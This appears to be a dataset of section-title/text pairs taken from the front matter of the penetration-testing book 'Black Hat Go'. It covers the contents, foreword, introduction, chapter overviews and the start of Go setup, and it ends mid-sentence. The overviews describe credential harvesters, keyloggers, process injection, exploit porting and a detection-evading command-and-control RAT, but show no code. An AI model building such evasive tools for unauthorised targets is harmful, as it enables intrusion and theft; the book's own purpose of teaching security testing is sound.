[
  {
    "input": "Title Page",
    "output": "BLACK HAT GO\nGo Programming for Hackers and\nPentesters\nby Tom Steele, Chris Patten, and Dan Kottmann\nSan Francisco"
  },
  {
    "input": "Copyright Page",
    "output": "BLACK HAT GO. Copyright © 2020 by Tom Steele, Chris Patten, and Dan\nKottmann.\nAll rights reserved. No part of this work may be reproduced or transmitted in any\nform or by any means, electronic or mechanical, including photocopying,\nrecording, or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\nISBN-10: 1-59327-865-9\nISBN-13: 978-1-59327-865-6\nPublisher: William Pollock\nProduction Editor: Laurel Chun\nCover Illustration: Jonny Thomas\nInterior Design: Octopod Studios\nDevelopmental Editors: Frances Saux and Zach Lebowski\nTechnical Reviewer: Alex Harvey\nCopyeditor: Sharon Wilkey\nCompositor: Danielle Foster\nProofreader: Brooke Littrel\nIndexer: Beth Nauman-Montana\nFor information on distribution, translations, or bulk sales, please contact No Starch\nPress, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 1.415.863.9900; info@nostarch.com\nwww.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nNames: Steele, Tom (Security Consultant), author. | Patten, Chris, author.\n| Kottmann, Dan, author.\nTitle: Black Hat Go : Go programming for hackers and pentesters / Tom\nSteele, Chris Patten, and Dan Kottmann.\nDescription: San Francisco : No Starch Press, 2020. | Includes\nbibliographical references and index. | Summary: \"A guide to Go that\nbegins by introducing fundamentals like data types, control structures,\nand error handling. Provides instruction on how to use Go for tasks such\nas sniffing and processing packets, creating HTTP clients, and writing\nexploits.\"-- Provided by publisher.\nIdentifiers: LCCN 2019041864 (print) | LCCN 2019041865 (ebook) | ISBN\n9781593278656 | ISBN 9781593278663 (ebook)\nSubjects: LCSH: Penetration testing (Computer security) | Go (Computer\nprogram language)\nClassification: LCC QA76.9.A25 S739 2020 (print) | LCC QA76.9.A25 (ebook)\n| DDC 005.8--dc23\nLC record available at https://lccn.loc.gov/2019041864\nLC ebook record available at https://lccn.loc.gov/2019041865\nNo Starch Press and the No Starch Press logo are registered trademarks of No\nStarch Press, Inc. Other product and company names mentioned herein may be the\ntrademarks of their respective owners. Rather than use a trademark symbol with\nevery occurrence of a trademarked name, we are using the names only in an\neditorial fashion and to the benefit of the trademark owner, with no intention of\ninfringement of the trademark.\nThe information in this book is distributed on an “As Is” basis, without warranty.\nWhile every precaution has been taken in the preparation of this work, neither the\nauthors nor No Starch Press, Inc. shall have any liability to any person or entity\nwith respect to any loss or damage caused or alleged to be caused directly or\nindirectly by the information contained in it."
  },
  {
    "input": "About the Authors",
    "output": "ABOUT THE AUTHORS\nTom Steele has been using Go since the version 1 release in\n2012 and was one of the first in his field to leverage the\nlanguage for offensive tooling. He is a managing principal\nresearch consultant at Atredis Partners with over 10 years of\nexperience performing adversarial and research-based security\nassessments. Tom has presented and conducted training\ncourses at numerous conferences, including Defcon, Black\nHat, DerbyCon, and BSides. Outside of tech, Tom is also a\nBlack Belt in Brazilian jiujitsu who competes regularly, both\nregionally and nationally. He owns and operates his own\njiujitsu academy in Idaho.\nChris Patten is the founding partner and lead consultant of\nSTACKTITAN, a specialized adversarial services security\nconsultancy. Chris has been practicing in the security industry\nfor more than 25 years in various capacities. He spent the last\ndecade consulting for a number of commercial and\ngovernment organizations on diverse security issues, including\nadversarial offensive techniques, threat hunting capabilities,\nand mitigation strategies. Chris spent his latest tenure leading\none of North America’s largest advanced adversarial teams.\nPrior to formal consulting, Chris honorably served in the\nUS Air Force, supporting the war-fighting effort. He actively\nserved within the Department of Defense Special Operations\nIntelligence community at USSOCOM, consulting for Special\nOperations Groups on sensitive cyber warfare initiatives.\nFollowing Chris’s military service, he held lead architect\npositions at numerous Fortune 500 telecommunication\ncompanies, working with partners in a research capacity.\nDan Kottmann is a founding partner and lead consultant of\nSTACKTITAN. He has played an integral role in the growth\nand development of the largest North American adversarial\nconsultancy, directly influencing technical tradecraft, process\nefficiency, customer experience, and delivery quality. With 15\nyears of experience, Dan has dedicated nearly the entirety of\nhis professional career to cross-industry, customer-direct\nconsulting and consultancy development, primarily focused on\ninformation security and application delivery.\nDan has presented at various national and regional security\nconferences, including Defcon, BlackHat Arsenal, DerbyCon,\nBSides, and more. He has a passion for software development\nand has created various open-source and proprietary\napplications, from simple command line tools to complex,\nthree-tier, and cloud-based web applications.\nABOUT THE TECHNICAL REVIEWER\nAlex Harvey has been working with technology his whole life\nand got his start with embedded systems, robotics, and\nprogramming. He moved into information security about 15\nyears ago, focusing on security testing and research. Never one\nto shy away from making a tool for the job, he started using\nthe Go programming language and has not looked back."
  },
  {
    "input": "BRIEF CONTENTS",
    "output": "BRIEF CONTENTS\nForeword by HD Moore\nAcknowledgments\nIntroduction\nChapter 1: Go Fundamentals\nChapter 2: TCP, Scanners, and Proxies\nChapter 3: HTTP Clients and Remote Interaction with Tools\nChapter 4: HTTP Servers, Routing, and Middleware\nChapter 5: Exploiting DNS\nChapter 6: Interacting with SMB and NTLM\nChapter 7: Abusing Databases and Filesystems\nChapter 8: Raw Packet Processing\nChapter 9: Writing and Porting Exploit Code\nChapter 10: Go Plugins and Extendable Tools\nChapter 11: Implementing and Attacking Cryptography\nChapter 12: Windows System Interaction and Analysis\nChapter 13: Hiding Data with Steganography\nChapter 14: Building a Command-and-Control RAT\nIndex"
  },
  {
    "input": "CONTENTS IN DETAIL",
    "output": "CONTENTS IN DETAIL\nFOREWORD by HD Moore\nACKNOWLEDGMENTS\nINTRODUCTION\nWho This Book Is For\nWhat This Book Isn’t\nWhy Use Go for Hacking?\nWhy You Might Not Love Go\nChapter Overview\n1\nGO FUNDAMENTALS\nSetting Up a Development Environment\nDownloading and Installing Go\nSetting GOROOT to Define the Go Binary Location\nSetting GOPATH to Determine the Location of Your Go Workspace\nChoosing an Integrated Development Environment\nUsing Common Go Tool Commands\nUnderstanding Go Syntax\nData Types\nControl Structures\nConcurrency\nError Handling\nHandling Structured Data\nSummary\n2\nTCP, SCANNERS, AND PROXIES\nUnderstanding the TCP Handshake\nBypassing Firewalls with Port Forwarding\nWriting a TCP Scanner\nTesting for Port Availability\nPerforming Nonconcurrent Scanning\nPerforming Concurrent Scanning\nBuilding a TCP Proxy\nUsing io.Reader and io.Writer\nCreating the Echo Server\nImproving the Code by Creating a Buffered Listener\nProxying a TCP Client\nReplicating Netcat for Command Execution\nSummary\n3\nHTTP CLIENTS AND REMOTE INTERACTION WITH\nTOOLS\nHTTP Fundamentals with Go\nCalling HTTP APIs\nGenerating a Request\nUsing Structured Response Parsing\nBuilding an HTTP Client That Interacts with Shodan\nReviewing the Steps for Building an API Client\nDesigning the Project Structure\nCleaning Up API Calls\nQuerying Your Shodan Subscription\nCreating a Client\nInteracting with Metasploit\nSetting Up Your Environment\nDefining Your Objective\nRetrieving a Valid Token\nDefining Request and Response Methods\nCreating a Configuration Struct and an RPC Method\nPerforming Remote Calls\nCreating a Utility Program\nParsing Document Metadata with Bing Scraping\nSetting Up the Environment and Planning\nDefining the metadata Package\nMapping the Data to Structs\nSearching and Receiving Files with Bing\nSummary\nHivaNetwork.Com\n4\nHTTP SERVERS, ROUTING, AND MIDDLEWARE\nHTTP Server Basics\nBuilding a Simple Server\nBuilding a Simple Router\nBuilding Simple Middleware\nRouting with the gorilla/mux Package\nBuilding Middleware with Negroni\nAdding Authentication with Negroni\nUsing Templates to Produce HTML Responses\nCredential Harvesting\nKeylogging with the WebSocket API\nMultiplexing Command-and-Control\nSummary\n5\nEXPLOITING DNS\nWriting DNS Clients\nRetrieving A Records\nProcessing Answers from a Msg struct\nEnumerating Subdomains\nWriting DNS Servers\nLab Setup and Server Introduction\nCreating DNS Server and Proxy\nSummary\n6\nINTERACTING WITH SMB AND NTLM\nThe SMB Package\nUnderstanding SMB\nUnderstanding SMB Security Tokens\nSetting Up an SMB Session\nUsing Mixed Encoding of Struct Fields\nUnderstanding Metadata and Referential Fields\nUnderstanding the SMB Implementation\nGuessing Passwords with SMB\nReusing Passwords with the Pass-the-Hash Technique\nRecovering NTLM Passwords\nCalculating the Hash\nRecovering the NTLM Hash\nSummary\n7\nABUSING DATABASES AND FILESYSTEMS\nSetting Up Databases with Docker\nInstalling and Seeding MongoDB\nInstalling and Seeding PostgreSQL and MySQL Databases\nInstalling and Seeding Microsoft SQL Server Databases\nConnecting and Querying Databases in Go\nQuerying MongoDB\nQuerying SQL Databases\nBuilding a Database Miner\nImplementing a MongoDB Database Miner\nImplementing a MySQL Database Miner\nPillaging a Filesystem\nSummary\n8\nRAW PACKET PROCESSING\nSetting Up Your Environment\nIdentifying Devices by Using the pcap Subpackage\nLive Capturing and Filtering Results\nSniffing and Displaying Cleartext User Credentials\nPort Scanning Through SYN-flood Protections\nChecking TCP Flags\nBuilding the BPF Filter\nWriting the Port Scanner\nSummary\n9\nWRITING AND PORTING EXPLOIT CODE\nCreating a Fuzzer\nBuffer Overflow Fuzzing\nSQL Injection Fuzzing\nPorting Exploits to Go\nPorting an Exploit from Python\nPorting an Exploit from C\nCreating Shellcode in Go\nC Transform\nHex Transform\nNum Transform\nRaw Transform\nBase64 Encoding\nA Note on Assembly\nSummary\n10\nGO PLUGINS AND EXTENDABLE TOOLS\nUsing Go’s Native Plug-in System\nCreating the Main Program\nBuilding a Password-Guessing Plug-in\nRunning the Scanner\nBuilding Plug-ins in Lua\nCreating the head() HTTP Function\nCreating the get() Function\nRegistering the Functions with the Lua VM\nWriting Your Main Function\nCreating Your Plug-in Script\nTesting the Lua Plug-in\nSummary\n11\nIMPLEMENTING AND ATTACKING\nCRYPTOGRAPHY\nReviewing Basic Cryptography Concepts\nUnderstanding the Standard Crypto Library\nExploring Hashing\nCracking an MD5 or SHA-256 Hash\nImplementing bcrypt\nAuthenticating Messages\nEncrypting Data\nSymmetric-Key Encryption\nAsymmetric Cryptography\nBrute-Forcing RC2\nGetting Started\nProducing Work\nPerforming Work and Decrypting Data\nWriting the Main Function\nRunning the Program\nSummary\n12\nWINDOWS SYSTEM INTERACTION AND ANALYSIS\nThe Windows API’s OpenProcess() Function\nThe unsafe.Pointer and uintptr Types\nPerforming Process Injection with the syscall Package\nDefining the Windows DLLs and Assigning Variables\nObtaining a Process Token with the OpenProcess Windows API\nManipulating Memory with the VirtualAllocEx Windows API\nWriting to Memory with the WriteProcessMemory Windows API\nFinding LoadLibraryA with the GetProcessAddress Windows API\nExecuting the Malicious DLL Using the CreateRemoteThread\nWindows API\nVerifying Injection with the WaitforSingleObject Windows API\nCleaning Up with the VirtualFreeEx Windows API\nAdditional Exercises\nThe Portable Executable File\nUnderstanding the PE File Format\nWriting a PE Parser\nAdditional Exercises\nUsing C with Go\nInstalling a C Windows Toolchain\nCreating a Message Box Using C and the Windows API\nBuilding Go into C\nSummary\n13\nHIDING DATA WITH STEGANOGRAPHY\nExploring the PNG Format\nThe Header\nThe Chunk Sequence\nReading Image Byte Data\nReading the Header Data\nReading the Chunk Sequence\nWriting Image Byte Data to Implant a Payload\nLocating a Chunk Offset\nWriting Bytes with the ProcessImage() Method\nEncoding and Decoding Image Byte Data by Using XOR\nSummary\nAdditional Exercises\n14\nBUILDING A COMMAND-AND-CONTROL RAT\nGetting Started\nInstalling Protocol Buffers for Defining a gRPC API\nCreating the Project Workspace\nDefining and Building the gRPC API\nCreating the Server\nImplementing the Protocol Interface\nWriting the main() Function\nCreating the Client Implant\nBuilding the Admin Component\nRunning the RAT\nImproving the RAT\nEncrypt Your Communications\nHandle Connection Disruptions\nRegister the Implants\nAdd Database Persistence\nSupport Multiple Implants\nAdd Implant Functionality\nChain Operating System Commands\nEnhance the Implant’s Authenticity and Practice Good OPSEC\nAdd ASCII Art\nSummary\nINDEX"
  },
  {
    "input": "FOREWORD",
    "output": "FOREWORD\nProgramming languages have always had an impact on\ninformation security. The design constraints, standard\nlibraries, and protocol implementations available within each\nlanguage end up defining the attack surface of any application\nbuilt on them. Security tooling is no different; the right\nlanguage can simplify complex tasks and make the incredibly\ndifficult ones trivial. Go’s cross-platform support, single-\nbinary output, concurrency features, and massive ecosystem\nmake it an amazing choice for security tool development. Go\nis rewriting the rules for both secure application development\nand the creation of security tools, enabling faster, safer, and\nmore portable tooling.\nOver the 15 years that I worked on the Metasploit\nFramework, the project went through two full rewrites,\nchanged languages from Perl to Ruby, and now supports a\nrange of multilingual modules, extensions, and payloads.\nThese changes reflect the constantly evolving nature of\nsoftware development; in order to keep up in security, your\ntools need to adapt, and using the right language can save an\nenormous amount of time. But just like Ruby, Go didn’t\nbecome ubiquitous overnight. It takes a leap of faith to build\nanything of value using a new language, given the\nuncertainties of the ecosystem and the sheer amount of effort\nneeded to accomplish common tasks before the standard\nlibraries catch up.\nThe authors of Black Hat Go are pioneers in Go security\ntool development, responsible for some of the earliest open\nsource Go projects, including BlackSheepWall, Lair\nFramework, and sipbrute, among many others. These projects\nserve as excellent examples of what can be built using the\nlanguage. The authors are just as comfortable building\nsoftware as tearing it apart, and this book is a great example of\ntheir ability to combine these skills.\nBlack Hat Go provides everything necessary to get started\nwith Go development in the security space without getting\nbogged down into the lesser-used language features. Want to\nwrite a ridiculous fast network scanner, evil HTTP proxy, or\ncross-platform command-and-control framework? This book is\nfor you. If you are a seasoned programmer looking for insight\ninto security tool development, this book will introduce the\nconcepts and trade-offs that hackers of all stripes consider\nwhen writing tools. Veteran Go developers who are interested\nin security may learn a lot from the approaches taken here, as\nbuilding tools to attack other software requires a different\nmindset than typical application development. Your design\ntrade-offs will likely be substantially different when your\ngoals include bypassing security controls and evading\ndetection.\nIf you already work in offensive security, this book will\nhelp you build utilities that are light-years faster than existing\nsolutions. If you work on the defense side or in incident\nresponse, this book will give you an idea of how to analyze\nand defend against malware written in the Go language.\nHappy hacking!\nHD Moore\nFounder of the Metasploit Project and the Critical Research\nCorporation\nVP of Research and Development at Atredis Partners"
  },
  {
    "input": "ACKNOWLEDGMENTS",
    "output": "ACKNOWLEDGMENTS\nThis book would not be possible had Robert Griesemer, Rob\nPike, and Ken Thompson not created this awesome\ndevelopment language. These folks and the entire core Go\ndevelopment team consistently contribute useful updates upon\neach release. We would have never written this book had the\nlanguage not been so easy and fun to learn and use.\nThe authors would also like to thank the team at No Starch\nPress: Laurel, Frances, Bill, Annie, Barbara, and everyone else\nwith whom we interacted. You all guided us through the\nunchartered territory of writing our first book. Life happens—\nnew families, new jobs—and all the while you’ve been patient\nbut still pushed us to complete this book. The entire No Starch\nPress team has been a pleasure to work with on this project.\nI would like to thank Jen for all her support, encouragement,\nand for keeping life moving forward while I was locked away\nin my office nights and weekends, working on this never-\nending book. Jen, you helped me more than you know, and\nyour constant words of encouragement helped make this a\nreality. I am sincerely grateful to have you in my life. I must\nthank “T” (my canine quadra-pet) for holding the floor down\nin my office while I hacked away and reminding me that\n“outside” is a real place I should visit. Lastly, and close to my\nheart, I want to dedicate this book to my pups, Luna and\nAnnie, who passed while I was writing this book. You girls\nwere and are everything to me and this book will always be a\nreminder of my love for you both.\nChris Patten\nI would like to extend a sincere thank you to my wife and best\nfriend, Katie, for your constant support, encouragement, and\nbelief in me. Not a day goes by when I’m not grateful for\neverything you do for me and our family. I’d like to thank\nBrooks and Subs for giving me reason to work so hard. There\nis no better job than being your father. And to the best “Office\nHounds” a guy could ask for—Leo (RIP), Arlo, Murphy, and\neven Howie (yes, Howie too)—you’ve systematically\ndestroyed my house and periodically made me question my\nlife choices, but your presence and companionship mean the\nworld to me. I’ll give each of you a signed copy of this book to\nchew on.\nDan Kottmann\nThank you to the love of my life, Jackie, for your love and\nencouragement; nothing I do would be possible without your\nsupport and everything you do for our family. Thank you to\nmy friends and colleagues at Atredis Partners and to anyone\nI’ve shared a shell with in the past. I am where I am because of\nyou. Thank you to my mentors and friends who have believed\nin me since day one. There are too many of you to name; I am\ngrateful for the incredible people in my life. Thank you, Mom,\nfor putting me in computer classes (these were a thing).\nLooking back, those were a complete waste of time and I spent\nmost of the time playing Myst, but it sparked an interest (I\nmiss the 90s). Most importantly, thank you to my Savior, Jesus\nChrist.\nHivaNetwork.Com\nTom Steele\nIt was a long road to get here—almost three years. A lot\nhas happened to get to this point, and here we are, finally. We\nsincerely appreciate the early feedback we received from\nfriends, colleagues, family, and early-release readers. For your\npatience, dear reader, thank you so, so very much; we are truly\ngrateful and hope you enjoy this book just as much as we\nenjoyed writing it. All the best to you! Now Go create some\namazing code!"
  },
  {
    "input": "INTRODUCTION",
    "output": "INTRODUCTION\nFor about six years, the three of us led one of North America’s\nlargest dedicated penetration-testing consulting practices. As\nprincipal consultants, we executed technical project work,\nincluding network penetration tests, on behalf of our clients—\nbut we also spearheaded the development of better tools,\nprocesses, and methodology. And at some point, we adopted\nGo as one of our primary development languages.\nGo provides the best features of other programming\nlanguages, striking a balance between performance, safety,\nand user-friendliness. Soon, we defaulted to it as our language\nof choice when developing tools. Eventually, we even found\nourselves acting as advocates of the language, pushing for our\ncolleagues in the security industry to try it. We felt the benefits\nof Go were at least worthy of consideration.\nIn this book, we’ll take you on a journey through the Go\nprogramming language from the perspective of security\npractitioners and hackers. Unlike other hacking books, we\nwon’t just show you how to automate third-party or\ncommercial tools (although we’ll touch on that a little).\nInstead, we’ll delve into practical and diverse topics that"
  },
  {
    "input": "Who This Book Is For",
    "output": "approach a specific problem, protocol, or tactic useful to\nadversaries. We’ll cover TCP, HTTP, and DNS\ncommunications, interact with Metasploit and Shodan, search\nfilesystems and databases, port exploits from other languages\nto Go, write the core functions of an SMB client, attack\nWindows, cross-compile binaries, mess with crypto, call C\nlibraries, interact with the Windows API, and much, much\nmore. It’s ambitious! We’d better begin . . .\nWHO THIS BOOK IS FOR\nThis book is for anyone who wants to learn how to develop\ntheir own hacking tools using Go. Throughout our professional\ncareers, and particularly as consultants, we’ve advocated for\nprogramming as a fundamental skill for penetration testers and\nsecurity professionals. Specifically, the ability to code\nenhances your understanding of how software works and how\nit can be broken. Also, if you’ve walked in a developer’s\nshoes, you’ll gain a more holistic appreciation for the\nchallenges they face in securing software, and you can use\nyour personal experience to better recommend mitigations,\neliminate false positives, and locate obscure vulnerabilities.\nCoding often forces you to interact with third-party libraries\nand various application stacks and frameworks. For many\npeople (us included), it’s hands-on experience and tinkering\nthat leads to the greatest personal development.\nTo get the most out of this book, we encourage you to\nclone the book’s official code repository so you have all the\nworking examples we’ll discuss. Find the examples at\nhttps://github.com/blackhat-go/bhg/."
  },
  {
    "input": "Why Use Go for Hacking?",
    "output": "WHAT THIS BOOK ISN’T\nThis book is not an introduction to Go programming in general\nbut an introduction to using Go for developing security tools.\nWe are hackers and then coders—in that order. None of us\nhave ever been software engineers. This means that, as\nhackers, we put a premium on function over elegance. In many\ninstances, we’ve opted to code as hackers do, disregarding\nsome of the idioms or best practices of software design. As\nconsultants, time is always scarce; developing simpler code is\noften faster and, therefore, preferable over elegance. When\nyou need to quickly create a solution to a problem, style\nconcerns come secondary.\nThis is bound to anger Go purists, who will likely tweet at\nus that we don’t gracefully handle all error conditions, that our\nexamples could be optimized, or that better constructs or\nmethods are available to produce the desired results. We’re\nnot, in most cases, concerned with teaching you the best, the\nmost elegant, or 100 percent idiomatic solutions, unless doing\nso will concretely benefit the end result. Although we’ll\nbriefly cover the language syntax, we do so purely to establish\na baseline foundation upon which we can build. After all, this\nisn’t Learning to Program Elegantly with Go—this is Black\nHat Go.\nWHY USE GO FOR HACKING?\nPrior to Go, you could prioritize ease of use by using\ndynamically typed languages—such as Python, Ruby, or PHP\n—at the expense of performance and safety. Alternatively, you\ncould choose a statically typed language, like C or C++, that\noffers high performance and safety but isn’t very user-friendly.\nGo is stripped of much of the ugliness of C, its primary\nancestor, making development more user-friendly. At the same\ntime, it’s a statically typed language that produces syntax\nerrors at compile time, increasing your assurance that your\ncode will actually run safely. As it’s compiled, it performs\nmore optimally than interpreted languages and was designed\nwith multicore computing considerations, making concurrent\nprogramming a breeze.\nThese reasons for using Go don’t concern security\npractitioners specifically. However, many of the language’s\nfeatures are particularly useful for hackers and adversaries:\nClean package management system Go’s package\nmanagement solution is elegant and integrated directly with\nGo’s tooling. Through the use of the go binary, you can\neasily download, compile, and install packages and\ndependencies, which makes consuming third-party libraries\nsimple and generally free from conflict.\nCross-compilation One of the best features in Go is its\nability to cross-compile executables. So long as your code\ndoesn’t interact with raw C, you can easily write code on\nyour Linux or Mac system but compile the code in a\nWindows-friendly, Portable Executable format.\nRich standard library Time spent developing in other\nlanguages has helped us appreciate the extent of Go’s\nstandard library. Many modern languages lack the standard\nlibraries required to perform many common tasks such as\ncrypto, network communications, database connectivity,\nand data encoding (JSON, XML, Base64, hex). Go"
  },
  {
    "input": "Chapter Overview",
    "output": "includes many of these critical functions and libraries as\npart of the language’s standard packaging, reducing the\neffort necessary to correctly set up your development\nenvironment or to call the functions.\nConcurrency Unlike languages that have been around\nlonger, Go was released around the same time as the initial\nmainstream multicore processors became available. For\nthis reason, Go’s concurrency patterns and performance\noptimizations are tuned specifically to this model.\nWHY YOU MIGHT NOT LOVE GO\nWe recognize that Go isn’t a perfect solution to every\nproblem. Here are some of the downsides of the language:\nBinary size ’Nuff said. When you compile a binary in Go,\nthe binary is likely to be multiple megabytes in size. Of\ncourse, you can strip debugging symbols and use a packer\nto help reduce the size, but these steps require attention.\nThis can be a drawback, particularly for security\npractitioners who need to attach a binary to an email, host it\non a shared filesystem, or transfer it over a network.\nVerbosity While Go is less verbose than languages like\nC#, Java, or even C/C++, you still might find that the\nsimplistic language construct forces you to be overly\nexpressive for things like lists (called slices in Go),\nprocessing, looping, or error handling. A Python one-liner\nmight easily become a three-liner in Go.\nCHAPTER OVERVIEW\nThe first chapter of this book covers a basic overview of Go’s\nsyntax and philosophy. Next, we start to explore examples that\nyou can leverage for tool development, including various\ncommon network protocols like HTTP, DNS, and SMB. We\nthen dig into various tactics and problems that we’ve\nencountered as penetration testers, addressing topics including\ndata pilfering, packet sniffing, and exploit development.\nFinally, we take a brief step back to talk about how you can\ncreate dynamic, pluggable tools before diving into crypto,\nattacking Microsoft Windows, and implementing\nsteganography.\nIn many cases, there will be opportunities to extend the\ntools we show you to meet your specific objectives. Although\nwe present robust examples throughout, our real intent is to\nprovide you with the knowledge and foundation through\nwhich you can extend or rework the examples to meet your\ngoals. We want to teach you to fish.\nBefore you continue with anything in this book, please note\nthat we—the authors and publisher—have created this content\nfor legal usage only. We won’t accept any liability for the\nnefarious or illegal things you choose to do. All the content\nhere is for educational purposes only; do not perform any\npenetration-testing activities against systems or applications\nwithout authorized consent.\nThe sections that follow provide a brief overview of each\nchapter.\nChapter 1: Go Fundamentals\nThe goal of this chapter is to introduce the fundamentals of the\nGo programming language and provide a foundation necessary\nfor understanding the concepts within this book. This includes\nan abridged review of basic Go syntax and idioms. We discuss\nthe Go ecosystem, including supporting tools, IDEs,\ndependency management, and more. Readers new to the\nprogramming language can expect to learn the bare necessities\nof Go, which will allow them to, hopefully, comprehend,\nimplement, and extend the examples in later chapters.\nChapter 2: TCP, Scanners, and Proxies\nThis chapter introduces basic Go concepts and concurrency\nprimitives and patterns, input/output (I/O), and the use of\ninterfaces through practical TCP applications. We’ll first walk\nyou through creating a simple TCP port scanner that scans a\nlist of ports using parsed command line options. This will\nhighlight the simplicity of Go code compared to other\nlanguages and will develop your understanding of basic types,\nuser input, and error handling. Next, we’ll discuss how to\nimprove the efficiency and speed of this port scanner by\nintroducing concurrent functions. We’ll then introduce I/O by\nbuilding a TCP proxy—a port forwarder—starting with basic\nexamples and refining our code to create a more reliable\nsolution. Lastly, we’ll re-create Netcat’s “gaping security\nhole” feature in Go, teaching you how to run operating system\ncommands while manipulating stdin and stdout and redirecting\nthem over TCP.\nChapter 3: HTTP Clients and Remote Interaction\nwith Tools\nHTTP clients are a critical component to interacting with\nmodern web server architectures. This chapter shows you how\nto create the HTTP clients necessary to perform a variety of\ncommon web interactions. You’ll handle a variety of formats\nto interact with Shodan and Metasploit. We’ll also\ndemonstrate how to work with search engines, using them to\nscrape and parse document metadata so as to extract\ninformation useful for organizational profiling activities.\nChapter 4: HTTP Servers, Routing, and Middleware\nThis chapter introduces the concepts and conventions\nnecessary for creating an HTTP server. We’ll discuss common\nrouting, middleware, and templating patterns, leveraging this\nknowledge to create a credential harvester and keylogger.\nLastly, we’ll demonstrate how to multiplex command-and-\ncontrol (C2) connections by building a reverse HTTP proxy.\nChapter 5: Exploiting DNS\nThis chapter introduces you to basic DNS concepts using Go.\nFirst, we’ll perform client operations, including how to look\nfor particular domain records. Then we’ll show you how to\nwrite a custom DNS server and DNS proxy, both of which are\nuseful for C2 operations.\nChapter 6: Interacting with SMB and NTLM\nWe’ll explore the SMB and NTLM protocols, using them as a\nbasis for a discussion of protocol implementations in Go.\nUsing a partial implementation of the SMB protocol, we’ll\ndiscuss the marshaling and unmarshaling of data, the usage of\ncustom field tags, and more. We’ll discuss and demonstrate\nhow to use this implementation to retrieve the SMB-signing\npolicy, as well as perform password-guessing attacks.\nChapter 7: Abusing Databases and Filesystems\nPillaging data is a critical aspect of adversarial testing. Data\nlives in numerous resources, including databases and\nfilesystems. This chapter introduces basic ways to connect to\nand interact with databases across a variety of common SQL\nand NoSQL platforms. You’ll learn the basics of connecting to\nSQL databases and running queries. We’ll show you how to\nsearch databases and tables for sensitive information, a\ncommon technique used during post-exploitation. We’ll also\nshow how to walk filesystems and inspect files for sensitive\ninformation.\nChapter 8: Raw Packet Processing\nWe’ll show you how to sniff and process network packets by\nusing the gopacket library, which uses libpcap. You’ll learn how to\nidentify available network devices, use packet filters, and\nprocess those packets. We will then develop a port scanner\nthat can scan reliably through various protection mechanisms,\nincluding syn-flood and syn-cookies, which cause normal port\nscans to show excessive false positives.\nChapter 9: Writing and Porting Exploit Code\nThis chapter focuses almost solely on creating exploits. It\nbegins with creating a fuzzer to discover different types of\nvulnerabilities. The second half of the chapter discusses how\nto port existing exploits to Go from other languages. This\ndiscussion includes a port of a Java deserialization exploit and\nthe Dirty COW privilege escalation exploit. We conclude the\nchapter with a discussion on creating and transforming\nshellcode for use within your Go programs.\nChapter 10: Go Plugins and Extendable Tools\nHivaNetwork.Com\nWe’ll introduce two separate methods for creating extendable\ntools. The first method, introduced in Go version 1.8, uses\nGo’s native plug-in mechanism. We’ll discuss the use cases\nfor this approach and discuss a second approach that leverages\nLua to create extensible tools. We’ll demonstrate practical\nexamples showing how to adopt either approach to perform a\ncommon security task.\nChapter 11: Implementing and Attacking\nCryptography\nThis chapter covers the fundamental concepts of symmetric\nand asymmetric cryptography using Go. This information\nfocuses on using and understanding cryptography through the\nstandard Go package. Go is one of the few languages that,\ninstead of using a third-party library for encryption, uses a\nnative implementation within the language. This makes the\ncode easy to navigate, modify, and understand.\nWe’ll explore the standard library by examining common\nuse cases and creating tools. The chapter will show you how to\nperform hashing, message authentication, and encryption.\nLastly, we’ll demonstrate how to brute-force decrypt an RC2-\nencrypted ciphertext.\nChapter 12: Windows System Interaction and\nAnalysis\nIn our discussion on attacking Windows, we’ll demonstrate\nmethods of interacting with the Windows native API, explore\nthe syscall package in order to perform process injection, and\nlearn how to build a Portable Executable (PE) binary parser.\nThe chapter will conclude with a discussion of calling native C\nlibraries through Go’s C interoperability mechanisms.\nChapter 13: Hiding Data with Steganography\nSteganography is the concealment of a message or file within\nanother file. This chapter introduces one variation of\nsteganography: hiding arbitrary data within a PNG image\nfile’s contents. These techniques can be useful for exfiltrating\ninformation, creating obfuscated C2 messages, and bypassing\ndetective or preventative controls.\nChapter 14: Building a Command-and-Control RAT\nThe final chapter discusses practical implementations of\ncommand-and-control (C2) implants and servers in Go. We’ll\nleverage the wisdom and knowledge gained in previous\nchapters to build a C2 channel. The C2 client/server\nimplementation will, by nature of being custom-made, avoid\nsignature-based security controls and attempt to circumvent\nheuristics and network-based egress controls."
  },
  {
    "input": "Setting Up a Development Environment",
    "output": "1\nGO FUNDAMENTALS\nThis chapter will guide you through the process of setting up\nyour Go development environment and introduce you to the\nlanguage’s syntax. People have written entire books on the\nfundamental mechanics of the language; this chapter covers\nthe most basic concepts you’ll need in order to work through\nthe code examples in the following chapters. We’ll cover\neverything from primitive data types to implementing\nconcurrency. For readers who are already well versed in the\nlanguage, you’ll find much of this chapter to be a review.\nSETTING UP A DEVELOPMENT\nENVIRONMENT\nTo get started with Go, you’ll need a functional development\nenvironment. In this section, we’ll walk you through the steps\nto download Go and set up your workspace and environment\nvariables. We’ll discuss various options for your integrated\ndevelopment environment and some of the standard tooling\nthat comes with Go.\nDownloading and Installing Go\nStart by downloading the Go binary release most appropriate\nto your operating system and architecture from\nhttps://golang.org/dl/. Binaries exist for Windows, Linux, and\nmacOS. If you’re using a system that doesn’t have an available\nprecompiled binary, you can download the Go source code\nfrom that link.\nExecute the binary and follow the prompts, which will be\nminimal, in order to install the entire set of Go core packages.\nPackages, called libraries in most other languages, contain\nuseful code you can use in your Go programs.\nSetting GOROOT to Define the Go Binary Location\nNext, the operating system needs to know how to find the Go\ninstallation. In most instances, if you’ve installed Go in the\ndefault path, such as /usr/local/go on a *Nix/BSD-based\nsystem, you don’t have to take any action here. However, in\nthe event that you’ve chosen to install Go in a nonstandard\npath or are installing Go on Windows, you’ll need to tell the\noperating system where to find the Go binary.\nYou can do this from your command line by setting the\nreserved GOROOT environment variable to the location of your\nbinary. Setting environment variables is operating-system\nspecific. On Linux or macOS, you can add this to your\n~/.profile:\nset GOROOT=/path/to/go\nOn Windows, you can add this environment variable\nthrough the System (Control Panel), by clicking the\nEnvironment Variables button.\nSetting GOPATH to Determine the Location of Your\nGo Workspace\nUnlike setting your GOROOT, which is necessary in only certain\ninstallation scenarios, you must always define an environment\nvariable named GOPATH to instruct the Go toolset where your\nsource code, third-party libraries, and compiled programs will\nexist. This can be any location of your choosing. Once you’ve\nchosen or created this base workspace 